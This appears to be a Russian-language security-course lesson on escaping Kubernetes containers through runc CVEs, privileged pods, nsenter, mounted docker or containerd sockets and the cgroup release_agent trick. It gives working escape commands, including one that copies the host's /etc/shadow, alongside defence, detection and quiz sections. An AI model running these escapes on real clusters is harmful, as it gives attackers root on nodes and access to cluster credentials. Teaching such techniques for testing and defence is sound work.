---
id: cloud-runc-escape-deep
title: "Побег из контейнера через runc: CVE и nsenter"
category: cloud
parent: cloud-k8s-security-deep
difficulty: expert
order: 3
tags: [cloud, kubernetes, runc, escape, nsenter, capabilities, seccomp, cgroup]
prerequisites: [cloud-k8s-security-deep, cloud-kubernetes-escape]
useful_for:
  - "Побег из контейнера в облаке"
  - "Эксплуатация runc/containerd CVE"
  - "Права root на хосте Kubernetes"
estimated_minutes: 55
summary: "Побег из контейнера через runc: CVE-2019-5736, CVE-2024-21626, привилегированные контейнеры, capabilities, nsenter и доступ к host-путям. Как от пода дойти до хоста."
---

## Зачем этот урок

Контейнер — это не песочница безопасности, а изоляция на уровне ядра. Ошибки в рантайме (runc/containerd) или конфигурации (privileged, hostPath, capabilities) позволяют выйти на хост. В облачном Kubernetes это особенно опасно: хост — это узел кластера, с которого видно токены других подов, kubelet, а иногда и облачные identity (IMDS). Этот урок — про побег: от известных CVE runc до ручных техник `nsenter` и злоупотребления capabilities.

## Модель изоляции

- **Namespaces** (pid, mount, net, uts, ipc, user) — изоляция ресурсов ядра.
- **cgroups** — ограничение ресурсов.
- **Capabilities** — разбитые root-привилегии (`CAP_SYS_ADMIN`, `CAP_SYS_PTRACE`, `CAP_NET_ADMIN`).
- **seccomp/AppArmor/SELinux** — фильтры системных вызовов и мандатный контроль.
- **runc** — низкоуровневый рантайм, создающий контейнер.
- **containerd/CRI-O** — высокоуровневые рантаймы.
- **hostPath/privileged** — монтирование хостовых путей и полные привилегии.

Побег = обход одного или нескольких слоёв. Чаще всего виноват не «дырявый» контейнер, а небезопасная конфигурация: `privileged: true`, `hostPID`, `hostPath: /`, `CAP_SYS_ADMIN`.

## Известные CVE runc

| CVE | Суть | Условие |
|---|---|---|
| CVE-2019-5736 | Перезапись бинарника runc через `/proc/self/exe` | Возможность запускать контейнеры, старый runc |
| CVE-2021-30465 | Symlink race в `mount` | Контроль над source/dest mount |
| CVE-2022-29162 | Неверный `default` в capabilities | Редкие конфигурации |
| CVE-2024-21626 | Утечка fd рабочей директории | Влияет на образы с `WORKDIR` + runc < 1.1.12 |

CVE-2024-21626 («Leaky Vessels») особенно практична: контейнер может получить доступ к файловой системе хоста через унаследованный файловый дескриптор, если образ задаёт `WORKDIR` и runc старый.

## Инструменты и команды

```bash
# Проверяем привилегии и capabilities
id
capsh --print
cat /proc/self/status | grep Cap
grep -i seccomp /proc/self/status

# Проверяем смонтированные хостовые пути
mount | grep -E 'hostPath|/host|/var/lib/kubelet'
ls -la /host 2>/dev/null
ls -la /var/lib/kubelet 2>/dev/null

# Проверяем, есть ли docker.sock / containerd.sock
ls -la /var/run/docker.sock /run/containerd/containerd.sock 2>/dev/null

# Если privileged и hostPID — смотрим процессы хоста
ps aux | head
```

## Разобранный пример: hostPID + CAP_SYS_ADMIN → хост

Сценарий: под запущен с `privileged: true` (или `hostPID: true` + `CAP_SYS_ADMIN`).

```bash
# 1. Смотрим процессы хоста (hostPID)
ps aux | grep -E 'kubelet|containerd|runc'
# root 1 ... /sbin/init
# root 1234 ... /usr/bin/kubelet

# 2. Побег через nsenter в namespace PID 1
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
# root@node:/#

# 3. Теперь мы на хосте — читаем kubelet-конфиги и токены
ls /var/lib/kubelet/
cat /var/lib/kubelet/pki/kubelet-client-current.pem 2>/dev/null
ls /etc/kubernetes/ 2>/dev/null
cat /etc/kubernetes/admin.conf 2>/dev/null   # если есть — полный admin kubeconfig

# 4. Или через hostPath /
# (если смонтирован / хоста в /host)
chroot /host /bin/bash
```

Если есть `hostPath: /`, можно читать/писать на хосте напрямую: добавить SSH-ключ, поставить cron, забрать `admin.conf`. Если есть `docker.sock` или `containerd.sock` — создайте привилегированный контейнер с монтированием `/`.

## Побег через docker/containerd socket

```bash
# Docker socket
docker -H unix:///var/run/docker.sock ps
docker -H unix:///var/run/docker.sock run -v /:/host --privileged -it alpine chroot /host sh

# containerd
ctr -a /run/containerd/containerd.sock --namespace k8s.io images ls
ctr -a /run/containerd/containerd.sock --namespace k8s.io run --privileged --mount type=bind,src=/,dst=/host docker.io/library/alpine esc sh
```

## Чек-лист побега

1. Проверить `privileged`, `hostPID`, `hostNetwork`, `hostPath`.
2. Проверить capabilities (`capsh --print`).
3. Проверить seccomp/AppArmor.
4. Проверить наличие socket'ов (docker/containerd).
5. Проверить смонтированные пути (`mount`).
6. Проверить версии runc/containerd на CVE.
7. Проверить доступ к `/proc` хоста (hostPID).

## Обход защит и edge cases

- **seccomp.** Может блокировать `nsenter`/`unshare`; проверьте профиль. `Unconfined` — нет фильтра.
- **AppArmor.** Может запрещать доступ к `/proc/*/root`; но привилегированный контейнер обычно `unconfined`.
- **Read-only rootfs.** Затрудняет запись, но hostPath/nsenter работают.
- **User namespaces.** Если включены, root в контейнере не root на хосте — сложнее.
- **runc версии.** Проверяйте `runc --version` на узле (если есть доступ) или через образ.
- **Kata/gVisor.** Другая модель изоляции; классические побеги не работают.

## Частые ошибки и подводные камни

- Считать `privileged: true` «просто удобным» — это фактически root на хосте.
- Не проверить `hostPID`: он даёт доступ к процессам хоста.
- Игнорировать `hostPath` монтирования.
- Путать `CAP_SYS_ADMIN` с полным root.
- Не проверить версию runc на известные CVE.

## Защита и детект

- Запретить `privileged`, `hostPID`, `hostNetwork`, `hostPath` через Pod Security Admission/Kyverno.
- Ограничить capabilities (drop ALL, add только нужные).
- Обновлять runc/containerd; использовать gVisor/Kata для сильной изоляции.
- Включить Falco/аудит на `nsenter`, монтирование, доступ к `/proc/*/root`.
- Ограничить доступ к docker/containerd socket.

## Модель угроз и типовые мисконфиги

Типичный мисконфиг — `privileged: true`. Второй — `hostPID` + `CAP_SYS_ADMIN`. Третий — `hostPath: /`. Четвёртый — смонтированный docker.sock. Пятый — старый runc с CVE. Все они дают root на узле.

## Практическое задание

1. Запустите под с `privileged: true` и выполните `nsenter --target 1 --mount --pid`.
2. Запустите под с `hostPath: /` и прочитайте файл хоста.
3. Смонтируйте docker.sock и создайте контейнер с `-v /:/host`.
4. Включите Pod Security `restricted` и проверьте, что привилегированный под отклоняется.

## Что дальше / решение

Побег даёт root на узле. Дальше — читать kubelet-креды, токены подов, admin.conf, облачные identity (IMDS). Зафиксируйте путь «под → nsenter → узел → кластер» в графе. Если Pod Security строгая — ищите другие поды/узлы или CVE.

## Разобранный пример 2: CVE-2024-21626 (Leaky Vessels)

CVE-2024-21626 — утечка файлового дескриптора рабочей директории в runc. Если образ задаёт `WORKDIR` и runc старый (< 1.1.12), контейнер может получить доступ к файловой системе хоста через унаследованный fd.

```bash
# В Dockerfile жертвы:
# FROM alpine
# WORKDIR /app
# ...

# В контейнере ищем унаследованный fd, указывающий на хостовый путь
ls -la /proc/self/fd/
# 3 -> /app  (может указывать на host /var/lib/...)

# Идём вверх по дереву от fd
ls -la /proc/self/fd/3/../
cd /proc/self/fd/3/../../.. && ls
# может показать содержимое хоста

# Если повезло — читаем файлы хоста
cat /proc/self/fd/3/../../../etc/hostname 2>/dev/null
```

Эксплуатация требует уязвимой версии runc и правильного образа. Проверяйте версию runc на узле (через `docker info`/`containerd` или `runc --version`, если есть доступ) и обновляйте рантайм. Для атакующего: этот CVE даёт побег без привилегированного контейнера, что обходит многие admission-политики, разрешающие обычные поды.

## CAP_SYS_ADMIN и монтирование

Даже без `privileged: true` комбинация `CAP_SYS_ADMIN` и `CAP_SYS_PTRACE` часто достаточна для побега.

```bash
# Проверяем capabilities
capsh --print | grep -E 'sys_admin|sys_ptrace|sys_module'
# Current: ... cap_sys_admin,cap_sys_ptrace ...

# С CAP_SYS_ADMIN можно монтировать hostPath, если он доступен
# или использовать cgroup release_agent (если cgroup v1)
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd
echo "cat /etc/shadow > $host_path/out" >> /cmd
chmod a+x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

Cgroup v1 `release_agent` — классическая техника побега с `CAP_SYS_ADMIN`. В cgroup v2 она не работает, но остаются другие пути: монтирование `/proc`, доступ к `/dev`, `io_uring`. Всегда проверяйте точный набор capabilities, а не только `privileged`.

## Квиз

```quiz
- question: "Что даёт privileged: true?"
  options:
    - "Практически все capabilities и доступ к устройствам хоста"
    - "Только больше памяти"
    - "Только сеть"
    - "Ничего"
  answer: 0
  explanation: "Привилегированный контейнер почти не изолирован от хоста."
- question: "Для чего нужен nsenter --target 1?"
  options:
    - "Войти в namespace процесса 1 (init хоста) и получить доступ к хосту"
    - "Создать новый контейнер"
    - "Шифровать данные"
    - "Менять DNS"
  answer: 0
  explanation: "nsenter в PID 1 с mount/pid даёт контекст хоста."
- question: "Какой CVE 2024 года связан с runc и утечкой fd?"
  options:
    - "CVE-2024-21626"
    - "CVE-2019-5736"
    - "CVE-2021-44228"
    - "CVE-2022-29162"
  answer: 0
  explanation: "Leaky Vessels / CVE-2024-21626 — утечка дескриптора рабочей директории."
- question: "Чем опасен смонтированный docker.sock?"
  options:
    - "Позволяет создать привилегированный контейнер с монтированием хоста"
    - "Только логи"
    - "Он шифрует"
    - "Он не опасен"
  answer: 0
  explanation: "Через docker API можно запустить контейнер с -v /:/host."
```

## Где пригодится

- **Пентест k8s:** побег и захват узла.
- **Red team:** доступ к облачным identity через узел.
- **Blue team:** настройка Pod Security.
- **Сертификация:** CKS.
